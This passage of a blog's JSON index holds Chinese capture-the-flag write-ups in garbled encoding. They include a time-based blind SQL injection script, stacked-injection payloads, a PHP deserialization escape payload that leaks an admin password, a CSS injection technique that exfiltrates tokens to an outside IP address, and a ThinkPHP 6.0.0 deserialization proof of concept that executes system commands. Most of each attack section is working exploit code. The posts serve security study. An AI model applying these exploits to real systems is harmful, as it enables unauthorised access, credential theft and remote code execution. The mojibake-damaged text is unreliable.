CONCAT(&quot;A&quot;, CAST(0 AS JSON)) æ¥å¦å…¶è¿”å›äºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œä»è€ŒåŒºåˆ†å¤§å°å†™ã€‚ æµ‹è¯•äº†ä¸€ä¸‹ SELECT CONCAT(&quot;A&quot;, CAST(0 AS JSON)) éœ€è¦mysql&gt;=5.7 å¯¹äºsys.x$schema_table_statistics_with_bufferæ˜¯è§†å›¾ï¼Œæ‰€ä»¥ä¸€å¼€å§‹æœ¬åœ°æ²¡æ‰¾åˆ°==ï¼ è§†å›¾æ˜¯åœ¨åŸºæœ¬è¡¨ä¹‹ä¸Šå»ºç«‹çš„è¡¨ï¼Œå®ƒçš„ç»“æ„ï¼ˆå³æ‰€å®šä¹‰çš„åˆ—ï¼‰å’Œå†…å®¹ï¼ˆå³æ‰€æœ‰è®°å½•ï¼‰éƒ½æ¥è‡ªåŸºæœ¬è¡¨ï¼Œå®ƒä¾æ®åŸºæœ¬è¡¨å­˜åœ¨è€Œå­˜åœ¨ã€‚ä¸€ä¸ªè§†å›¾å¯ä»¥å¯¹åº”ä¸€ä¸ªåŸºæœ¬è¡¨ï¼Œä¹Ÿå¯ä»¥å¯¹åº”å¤šä¸ªåŸºæœ¬è¡¨ã€‚è§†å›¾æ˜¯åŸºæœ¬è¡¨çš„æŠ½è±¡å’Œåœ¨é€»è¾‘æ„ä¹‰ä¸Šå»ºç«‹çš„æ–°å…³ç³»ã€‚","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-1","slug":"2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-1","date":"2020-02-22T07:05:27.000Z","updated":"2020-02-27T10:46:57.992Z","comments":true,"path":"2020/02/22/2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-1/","link":"","permalink":"https://glotozz.github.io/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-1/","excerpt":"æœ€è¿‘åšå•¥éƒ½æ²¡è€å¿ƒ==ï¼","text":"æœ€è¿‘åšå•¥éƒ½æ²¡è€å¿ƒ==ï¼ &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ç›²æ³¨ ç¬¬ä¸€ç§ï¼Œä¸ç”¨selectï¼ˆåªèƒ½æŸ¥å½“å‰è¡¨ï¼‰ ç¬¬äºŒç§ï¼Œåˆ©ç”¨å †å æ³¨å…¥ï¼Œ16è¿›åˆ¶+mysqlé¢„å¤„ç† babyphp å‚è€ƒé“¾æ¥: ç›²æ³¨ç»™äº†æºç ï¼Œç®€å•æµ‹ä¸€ä¸‹è¿‡æ»¤å†…å®¹ selectè¢«è¿‡æ»¤ï¼ï¼ä»¥åŠ= likeç­‰ï¼Œå¯ç”¨regexp æ²¡æœ‰å›æ˜¾è€ƒè™‘æ—¶é—´ç›²æ³¨ã€‚selectè¢«è¿‡æ»¤ï¼Œæˆ‘é€šå¸¸ä¸¤ç§åŠæ³•ï¼Œ ç¬¬ä¸€ç§ï¼Œä¸ç”¨selectï¼ˆåªèƒ½æŸ¥å½“å‰è¡¨ï¼‰11 and if(1,sleep(5),1) æˆåŠŸå»¶æ—¶ 121 and if(database() regexp(&#39;^&#39;))1 and if((flllllllag.fl4g regexp&quot;^f&quot;),sleep(5),1) ä¸€å¼€å§‹ä¸çŸ¥é“ä¸ºå•¥è·‘åˆ°flag{å°±æ–­äº†ï¼Œç´¢æ€§åŠ ä¸ªhex()ï¼Œå°±å¥½äº† 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python2# coding=utf-8import stringimport requestsurl = \"http://de1da794b0d046e6abd2bf3f1a1c8f8d25930eca82df4eb4.changame.ichunqiu.com/?id=\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0'&#125;easy_string = string.digits + string.ascii_letters# print easy_stringflag = \"\"tmp = 0flag = ''for i in range(1, 100): if tmp == 1: break tmp = 1 for j in easy_string: param = '2 or if((hex(flllllllag.fl4g) regexp\"^&#123;&#125;\"),sleep(5),1)'.format(flag+j) # print param try: url1 = url + param r = requests.get(url=url1, headers=headers, timeout=3) # if r.status_code != 200: # j -= 1 # continue # print(r.content.decode('utf-8')) except requests.exceptions.ReadTimeout as e: tmp = 0 flag = flag + j print(flag) breakprint(flag) ç¬¬äºŒç§ï¼Œåˆ©ç”¨å †å æ³¨å…¥ï¼Œ16è¿›åˆ¶+mysqlé¢„å¤„ç† å †å æ³¨å…¥ï¼š https://www.jianshu.com/p/36f0772f5ce8 å…ˆåˆ¤æ–­èƒ½å¦å †å æ³¨å…¥ï¼Œæ—¢ç„¶ä¸èƒ½ç”¨selectï¼Œç”¨showä»£æ›¿ 11;show tables;# å‘ç°æ²¡æœ‰æŠ¥500ï¼Œåº”è¯¥å¯ä»¥å †å æ³¨å…¥ 3ç§payload 1PREPARE jwt from concat(char(115,101,108,101,99,116), &#39; * from &#96;1919810931114514&#96; &#39;);EXECUTE jwt;# 1SET @sql&#x3D;concat(char(115,101,108,101,99,116),&#39;* from &#96;1919810931114514&#96;&#39;);PREPARE jwt from @sql;EXECUTE jwt;# 1PREPARE jwt from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from &#96;1919810931114514&#96; &#39;);EXECUTE jwt;# ä½†æ˜¯æˆ‘æœ¬åœ°æµ‹è¯•æ—¶åªæœ‰ç¬¬äºŒä¸ªèƒ½æ‰§è¡Œï¼Œè€Œç¬¬äºŒä¸ªæ°æ°ä½¿ç”¨äº†= çŒœæµ‹æ˜¯ç‰ˆæœ¬é—®é¢˜ï¼Œå…ˆå»çœ‹äº†åŸé¢˜ ç®€å•æ¥è¯´ï¼ŒMariaDBæ˜¯MySQLæºä»£ç çš„ä¸€ä¸ªåˆ†æ”¯ , MariaDBåŒ…æ‹¬çš„ä¸€äº›æ–°ç‰¹æ€§ä½¿å®ƒä¼˜äºMySQLã€‚ MariaDBè·ŸMySQLåœ¨ç»å¤§å¤šæ•°æ–¹é¢æ˜¯å…¼å®¹çš„ï¼Œå¯¹äºå¼€å‘è€…æ¥è¯´ï¼Œå‡ ä¹æ„Ÿè§‰ä¸åˆ°ä»»ä½•ä¸åŒã€‚ ç„¶åæˆ‘æŠŠæœ¬åœ°mysqlç‰ˆæœ¬åˆ‡åˆ°mysql8.0.12ï¼Œå·²é€‰æ‹©æ‰§è¡Œæ˜¯æ­£å¸¸çš„ï¼Œæ•´ä¸ªæ‰§è¡Œè¿˜æ˜¯ä¸€æ ·ä¸è¡Œ æƒ³ç›´æ¥åœ¨é¢˜ç›®ä¸Šæ‰“ä¸€æ‰“è¯•è¯•ï¼Œå‘ç°ç¯å¢ƒå·²ç»å…³äº†ï¼Œé‚ä½œç½¢ babyphpwww.zipæºç æ³„éœ²ï¼Œä»£ç å®¡è®¡ï¼Œæ€è·¯å¾ˆæ˜ç¡®ï¼Œ 1234if($_SESSION[&#39;login&#39;]&#x3D;&#x3D;&#x3D;1)&#123; require_once(&quot;flag.php&quot;); echo $flag;&#125; éœ€è¦æˆåŠŸç™»å½•adminï¼Œ å¯»æ‰¾ååºåˆ—åŒ–å…¥å£ï¼Œ 123456789101112public function update()&#123; $Info&#x3D;unserialize($this-&gt;getNewinfo()); $age&#x3D;$Info-&gt;age; $nickname&#x3D;$Info-&gt;nickname; $updateAction&#x3D;new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&quot;update user SET age&#x3D;$age,nickname&#x3D;$nickname where id&#x3D;&quot;.$_SESSION[&#39;id&#39;]); &#x2F;&#x2F;è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘&#125;public function getNewInfo()&#123; $age&#x3D;$_POST[&#39;age&#39;]; $nickname&#x3D;$_POST[&#39;nickname&#39;]; return safe(serialize(new Info($age,$nickname)));&#125; æ­£å¸¸æƒ…å†µä¸‹è¿™é‡Œçš„ååºåˆ—åŒ–æˆ‘ä»¬åªèƒ½æ§åˆ¶Infoç±»çš„ä¸¤ä¸ªå±æ€§ï¼Œä½†æ˜¯è¿™é‡Œé€šè¿‡safe()æ–¹æ³•å¯ä»¥é€ƒé€¸å­—ç¬¦ï¼Œç”šè‡³è¿˜å¯ä»¥é€ƒé€¸å¯¹è±¡ æ€è·¯ä¸€ã€ User-&gt;__destruct()è¯»å–flag.php ä½†æ˜¯å¾ˆå¿«å°±å‘ç°è¡Œä¸é€šã€‚é¦–å…ˆæ˜¯returnï¼Œä¸ä¼šæ‰“å°å‡ºæ¥ï¼Œå…¶æ¬¡flagè¢«è¿‡æ»¤æ›¿æ¢æˆhacker æ€è·¯äºŒã€ æ³¨å‡ºadminå¯†ç ç™»é™†åæŸ¥çœ‹ UpdateHelperç±»-&gt;__destruct() Userç±»-&gt;toString() Infoç±»-&gt;__call() dbCtrlç±»-&gt;login() æ„é€ ä¸€ä¸ªæ­£å¸¸çš„payloadï¼Œæ¯”å¦‚POST:age=&amp;nickname= 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:0:&quot;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125; æµ‹è¯•é€ƒé€¸ï¼Œæ¯”å¦‚é€ƒé€¸å‡º$CtrlCaseçš„å€¼ä¸ºhahaï¼Œ 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:0:&quot;&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;&#125; paylaod 1&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;&#125; éœ€è¦é€ƒé€¸29ä¸ªå­—ç¬¦ï¼Œ&#39;-&gt;hackeré€ƒé€¸5ä¸ªå­—ç¬¦,æ„é€ 5ä¸ªå•å¼•å·å’Œ4ä¸ªunion POST:age=&amp;nickname=&#39;&#39;&#39;&#39;&#39;unionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;} ä¸‹é¢æ˜¯åºåˆ—åŒ–å†…å®¹ 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:55:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhacker1&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;&#125;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125; å†ä¸¾ä¸ªé€ƒé€¸å¯¹è±¡çš„ä¾‹å­ 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:0:&quot;&quot;;s:8:&quot;CtrlCase&quot;;O:4:&quot;User&quot;:1:&#123;s:8:&quot;nickname&quot;;s:8:&quot;flag.php&quot;;&#125;&#125; 1&quot;;s:8:&quot;CtrlCase&quot;;O:4:&quot;User&quot;:1:&#123;s:8:&quot;nickname&quot;;s:8:&quot;flag.php&quot;;&#125;&#125; 63ä¸ªé€ƒé€¸å­—ç¬¦-12ä¸ªå•å¼•å·å’Œ3ä¸ªunionï¼Œè¿™é‡Œè¦æ³¨æ„çš„æ˜¯é¢˜ç›®ä¸­flagä¹Ÿè¢«æ›¿æ¢æˆhacker åœ¨æ„é€ å‰åˆ†æä¸‹sql 123456789$result&#x3D;$this-&gt;mysqli-&gt;prepare($sql);$result-&gt;bind_param(&#39;s&#39;, $this-&gt;name);$result-&gt;execute();$result-&gt;bind_result($idResult, $passwordResult);$result-&gt;fetch();$result-&gt;close();if ($this-&gt;token&#x3D;&#x3D;&#39;admin&#39;) &#123; return $idResult;&#125; è¿”å›ç»“æœé›†ä¸­çš„$idResultï¼ŒæŸ¥è¯¢çš„æ—¶å€™æŠŠç¬¬ä¸€ä¸ªå‚æ•°æ”¹ä¸ºpasswordå³å¯ 1select password,id from user where username&#x3D;? payload 12345678910111213141516171819202122232425262728293031323334&lt;?phpClass UpdateHelper&#123; public $sql;&#125;Class User&#123; public $nickname; public $age;&#125;Class Info&#123; public $age; public $CtrlCase;&#125;Class dbCtrl&#123; public $name; public $hostname=\"127.0.0.1\"; public $dbuser=\"noob123\"; public $dbpass=\"noob123\"; public $database=\"noob123\"; public $token;&#125;$d = new dbCtrl;$d-&gt;name = 'admin';$d-&gt;token = 'admin';$c = new Info;$c-&gt;CtrlCase = $d;$b = new User;$b-&gt;age = 'select password,id from user where username=?';$b-&gt;nickname = $c;$a = new UpdateHelper;$a-&gt;sql = $b;echo serialize($a);?&gt; å¾—åˆ° 1O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;&#125;&#125; æ»¡è¶³æ ¼å¼ 1&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;&#125;&#125;&#125; 365ä½ï¼Œ73ä¸ªå•å¼•å· 1age&#x3D;&amp;nickname&#x3D;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;&#125;&#125;&#125; md5è§£å¯†ç™»å½•å³å¯ å‚è€ƒé“¾æ¥: http://p3rh4ps.top/index.php/2020/02/21/820-2-21-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b%e5%87%ba%e9%a2%98%e7%ac%94%e8%ae%b0/?tdsourcetag=s_pctim_aiomsg","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"New Start","slug":"start","date":"2020-02-20T11:17:40.000Z","updated":"2020-02-20T11:59:16.262Z","comments":true,"path":"2020/02/20/start/","link":"","permalink":"https://glotozz.github.io/2020/02/20/start/","excerpt":"","text":"ã€‚å³æ˜¯ç»ˆç‚¹ä¹Ÿæ˜¯èµ·ç‚¹","categories":[],"tags":[]},{"title":"cssæ³¨å…¥å­¦ä¹ ","slug":"cssæ³¨å…¥å­¦ä¹ ","date":"2019-12-02T01:19:49.000Z","updated":"2020-03-29T15:06:13.113Z","comments":true,"path":"2019/12/02/cssæ³¨å…¥å­¦ä¹ /","link":"","permalink":"https://glotozz.github.io/2019/12/02/css%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ä¸€ã€å‡è®¾ä¸€ä¸ªphpé¡µé¢ äºŒã€çªƒå–inputæ ‡ç­¾ä¸­çš„token ä¸‰ã€çªƒå–&lt;script&gt;æ ‡ç­¾ä¸­çš„token å‚è€ƒé“¾æ¥ cssæœ¬èº«æ˜¯ä¸€ç§å®¹é”™ç‡å¾ˆå¼ºçš„è¯­è¨€ï¼Œcssæ–‡ä»¶å³ä½¿é‡åˆ°é”™è¯¯ï¼Œä¹Ÿä¼šä¸€ç›´è¯»å–ï¼Œç›´åˆ°æœ‰ç¬¦åˆç»“æ„çš„è¯­å¥ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨cssè§£æçš„å®¹é”™æ€§æ„é€  %0a){}body{color:red}/* æ¥æ‰§è¡Œä»»æ„cssã€‚ ä¸€ã€å‡è®¾ä¸€ä¸ªphpé¡µé¢1234567891011121314&lt;?php$token1 &#x3D; md5($_SERVER[&#39;HTTP_USER_AGENT&#39;]);$token2 &#x3D; md5($token1);?&gt;&lt;!doctype html&gt;&lt;meta charset&#x3D;utf-8&gt;&lt;input type&#x3D;hidden value&#x3D;&lt;?&#x3D;$token1 ?&gt;&gt;&lt;script&gt; var TOKEN &#x3D; &quot;&lt;?&#x3D;$token2 ?&gt;&quot;;&lt;&#x2F;script&gt;&lt;style&gt; &lt;?&#x3D;preg_replace(&#39;#&lt;&#x2F;style#i&#39;, &#39;#&#39;, $_GET[&#39;css&#39;]) ?&gt;&lt;&#x2F;style&gt; äºŒã€çªƒå–inputæ ‡ç­¾ä¸­çš„token12345&#x2F;*é€‰æ‹©valueå€¼ä¸ºabcçš„inputæ ‡ç­¾*&#x2F;input[value&#x3D;&quot;abc&quot;] &#123; &#125;&#x2F;*é€‰æ‹©valueå€¼ä»¥aå¼€å¤´çš„inputæ ‡ç­¾ *&#x2F;input[value^&#x3D;&quot;a&quot;] &#123; &#125; é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¸Šé¢çš„æ¥çˆ†ç ´ç¬¬ä¸€ä¸ªå­—ç¬¦ æ¯”å¦‚ 123input[value^&#x3D;&quot;0&quot;] &#123; background: url(http:&#x2F;&#x2F;serwer-napastnika&#x2F;0);&#125; æœ‰ä¸ªå‘ï¼Œæœ€æ–°ç‰ˆfirefoxå¦‚æœtype=hidddenä¼šæ— æ³•åŠ è½½ï¼Œä¸Šé¢çš„å›¾æ˜¯åˆ å»type=hiddençš„æ—¶å€™ chromeå¯ä»¥ ä¸€å¼€å§‹æƒ³ç€æ„é€ payloadç„¶åç”¨è„šæœ¬å‘åŒ…ï¼Œå‘ç°è„šæœ¬å‘çš„ä¼šæ”¶ä¸åˆ°ï¼ŒåŸå› å¯èƒ½æ˜¯å› ä¸ºè¿™æ˜¯æµè§ˆå™¨å»è¯·æ±‚çš„ã€‚ã€‚ã€‚åŒæ ·ç›´æ¥æŠŠpayloadæ”¾firefoxä¹Ÿä¸è¡Œï¼Œé‚£ä¹ˆå°±ç”Ÿæˆpayloadæ”¾å…¥chormeå³å¯ï¼Œå†æ ¹æ®vpsçš„æ—¥å¿—ç”Ÿæˆä¸‹ä¸€ä¸ªpayload 123456res &#x3D; &quot;&quot;for i in &#39;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;&#39;: a &#x3D; &#39;input[value^&#x3D;&quot;28&#39;+str(i)+&#39;&quot;] &#123;background:url(\\&#39;http:&#x2F;&#x2F;59.110.164.44&#x2F;28&#39;+str(i)+&#39;\\&#39;);&#125;&#39; print a res +&#x3D; a+&quot;\\n&quot;print res é¢˜ç›®ç¯å¢ƒå…³äº†ï¼Œå¼€ä¸€ä¸ªdocker dockeråœ°å€ï¼šhttps://github.com/D0g3-Lab/i-SOON_CTF_2019/tree/master/Web/cssgame è¿™é‡Œæ˜¯å¤–é“¾cssï¼Œé‚£ä¹ˆæŠŠcssæ–‡ä»¶æ”¾åˆ°vpsä¸Šï¼Œæ¯æ¬¡ä¿®æ”¹å³å¯ ä¸‰ã€çªƒå–&lt;script&gt;æ ‡ç­¾ä¸­çš„token æ„é€ ä¸€ä¸ªå­—ä½“ï¼ŒæŠŠæ‰€æœ‰å­—ç¬¦çš„å®½åº¦éƒ½è®¾ç½®ä¸º0ã€‚ æŠŠã€Œxctfã€çš„å®½åº¦è®¾ç½®ä¸º10000ã€‚ å½“é¡µé¢é‡Œå‡ºç°ã€Œxctfã€çš„æ—¶å€™ï¼Œå°±ä¼šå‡ºç°æ»šåŠ¨æ¡ã€‚ åœ¨æ»šåŠ¨æ¡çš„æ ·å¼é‡Œï¼Œé€šè¿‡background: url()å‘é€è¯·æ±‚ã€‚ é€ä½çˆ†ç ´ã€‚ æˆ‘ä»¬å°†ä½¿ç”¨è¿å­—å’Œæ ·å¼æ»šåŠ¨æ¡å®šä¹‰æˆ‘ä»¬è‡ªå·±çš„å­—ä½“æ¥å®Œæˆæ”»å‡»ã€‚ä»€ä¹ˆæ˜¯è¿å­—ï¼šhttp://www.mzh.ren/ligature-intro.html å€ŸåŠ©fontforgeç­‰å…¶ä»–è½¯ä»¶ ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºè‡ªå·±çš„å­—ä½“åŒ…æ‹¬è‡ªå·±çš„è¿å­—ã€‚Fontforgeæ˜¯ä¸€ä¸ªç›¸å½“å¼ºå¤§çš„å­—ä½“åˆ›å»ºå·¥å…·ã€‚æˆ‘ä»¬å°†ä½¿ç”¨å®ƒå°†å­—ä½“ä»SVGæ ¼å¼è½¬æ¢ä¸ºWOFFã€‚ æ€è·¯è¿˜æ˜¯å®¹æ˜“ç†è§£çš„ï¼Œå¤ç°æœ‰ç‚¹éº»çƒ¦ï¼Œå…·ä½“å‚è€ƒé“¾æ¥ğŸ¤¦â€â™‚ï¸ å‚è€ƒé“¾æ¥ https://www.smi1e.top/%e9%80%9a%e8%bf%87css%e6%b3%a8%e5%85%a5%e7%aa%83%e5%8f%96html%e4%b8%ad%e7%9a%84%e6%95%b0%e6%8d%ae/ https://xz.aliyun.com/t/6655#toc-5","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://glotozz.github.io/tags/ctf/"}]},{"title":"tp6.0.0ååºåˆ—åŒ–æ¼æ´åˆ†æ","slug":"tp6-0-0ååºåˆ—åŒ–æ¼æ´åˆ†æ","date":"2019-12-01T05:54:22.000Z","updated":"2020-03-29T15:06:57.427Z","comments":true,"path":"2019/12/01/tp6-0-0ååºåˆ—åŒ–æ¼æ´åˆ†æ/","link":"","permalink":"https://glotozz.github.io/2019/12/01/tp6-0-0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ä¸€ã€è·å–æ¼æ´ äºŒã€æ¼æ´å®ç° ä¸‰ã€æ¼æ´åˆ†æ å‚è€ƒé“¾æ¥ è¿™æ¬¡å®‰æ´µæ¯è€ƒåˆ°äº†è¿™ä¸ªï¼Œå½“æ—¶æ²¡æ—¶é—´åˆ†æï¼Œè·Ÿç€åŠ›å“¥çš„blogåˆ†æä¸€ä¸‹ï¼Œé¡ºä¾¿ææ¸…æ¥šåŠ›å“¥çš„expä¸ºå•¥æ˜¯é”™çš„ğŸ˜ toString()é­”æœ¯æ–¹æ³•è§¦å‘æ–¹æ³•ï¼Œæ‘˜è‡ªpç¥çŸ¥è¯†æ˜Ÿçƒ ä¸€ã€è·å–æ¼æ´tp6.0 ä¿®æ”¹app/controller/Index.php 1234567891011&lt;?phpnamespace app\\controller;class Index&#123; public function index($input&#x3D;&#39;&#39;) &#123; echo $input; unserialize($input); &#125;&#125; äºŒã€æ¼æ´å®ç° ä¸‰ã€æ¼æ´åˆ†ætp5.1å’Œtp5.2çš„æ¼æ´å…¥å£éƒ½æ˜¯Windowsç±»çš„__destruct() tp6å…¨å±€æœç´¢__destruct()ï¼Œ vendor/topthink/think-orm/src/Model.php $this-&gt;lazySaveå¯æ§ï¼Œè¿½è¸ªsave() å…¶ä¸­updateData()å¯ä»¥è¿›ä¸€æ­¥åˆ©ç”¨ è·Ÿè¿›checkAllowFields() æ­¤å¤„å­˜åœ¨å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œè¿½è¸ªdb()ä¹Ÿå­˜åœ¨å­—ç¬¦ä¸²æ‹¼æ¥ è¿™é‡Œå’ŒåŠ›å“¥çš„ä»£ç ä¸å¤ªä¸€æ ·ï¼Œä½†æ˜¯ä¸å½±å“ ä¹‹å‰æåˆ°å­—ç¬¦ä¸²æ‹¼æ¥ä¼šè§¦å‘__toString() å°è¯•æ„é€ ï¼Œè¿™é‡Œç›´æ¥é™æ€è°ƒç”¨db()å±æ€§ï¼Œè¿½è¸ªconnect() ä¼¼ä¹éƒ½æ²¡å•¥é™åˆ¶ã€‚ã€‚ æ•´ç†ä¸€ä¸‹POPé“¾ Modelç±»-&gt;__destruct()-&gt;save()-&gt;updateData()-&gt;checkAllowField()-&gt;toString() ä¹‹åå°±æ˜¯ä¹‹å‰tp5.2çš„é“¾ Conversionæ˜¯traitç±»å‹çš„ï¼Œä¸èƒ½å®ä¾‹åŒ–ï¼Œé€šè¿‡useæ¥ä½¿ç”¨ï¼Œæœç´¢å®šä½åˆ°Modelç±»ï¼Œ è¿™é‡ŒæŒºå·§çš„ï¼Œæœ€åéƒ½æ˜¯Modelç±» ç›´æ¥å†™expï¼Œåœ¨ä¹‹å‰tp5.2çš„åŸºç¡€ä¸Šä¿®æ”¹ poc 123456789101112131415161718192021222324252627282930313233343536&lt;?phpnamespace think &#123; abstract class Model&#123; private $data; private $withAttr &#x3D; []; private $lazySave &#x3D; true; protected $table; function __construct($closure,$b&#x3D;&#39;&#39;) &#123; &#x2F;&#x2F; var_dump($closure); $this-&gt;data &#x3D; $closure; $this-&gt;withAttr &#x3D; [&quot;glotozz&quot;&#x3D;&gt;&#39;system&#39;]; &#x2F;&#x2F; var_dump($b); $this-&gt;name &#x3D; $b; &#125; &#125;&#125;namespace think\\model &#123; class Pivot extends \\think\\Model&#123; function __construct($closure,$b&#x3D;&#39;&#39;) &#123; &#x2F;&#x2F;æ³¨æ„è¿™é‡Œä¸æ˜¯$b&#x3D;&#39;&#39; parent::__construct($closure,$b); &#125; &#125;&#125;namespace&#123; $pivot &#x3D; new think\\model\\Pivot([&#39;glotozz&#39;&#x3D;&gt;&#39;ls &#x2F;&#39;]); $model &#x3D; new think\\model\\Pivot([&#39;glotozz&#39;&#x3D;&gt;&#39;ls &#x2F;&#39;],$pivot); echo urlencode(serialize($model)); &#x2F;&#x2F; var_dump($model);&#125; ç”¨xdebugæ…¢æ…¢è°ƒï¼Œå“ªé‡Œä¸å¯¹æ”¹å“ªé‡Œã€‚ã€‚é€šå¸¸æ˜¯æœªå¯¹å±æ€§è¿›è¡Œä¿®é¥°ğŸ§ é‚£ä¹ˆç”¨expæ‰“ä¸€ä¸‹é¢˜ç›®è¯•è¯•ï¼Œæ²¡å•¥ç»“æœã€‚ã€‚ã€‚ æˆ‘æœ¬åœ°æ­å»ºäº†ä¸€ä¸‹å¹¶è°ƒè¯• å‘ç°åŸæ¥æ˜¯å‡ºé¢˜äººå·å·æŠŠè¿™é‡Œæ”¹äº†ã€‚ã€‚ã€‚é‚£ä¹ˆæˆ‘åªéœ€è¦æŠŠnameå˜é‡æ”¹æˆtableå³å¯ ç®€å•è°ƒè¯•ä¸‹åŠ›å“¥çš„expï¼Œç›®å‰å·²çŸ¥çš„æ˜¯æºç æœ‰ç‚¹ä¸åŒï¼Œ æ˜¯è¿™é‡Œç›´æ¥exit()äº†ã€‚ã€‚ã€‚ å‚è€ƒé“¾æ¥ https://zhzhdoai.github.io/2019/10/02/ThinkPHP-6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%89%8D%E8%A8%80","categories":[],"tags":[{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç 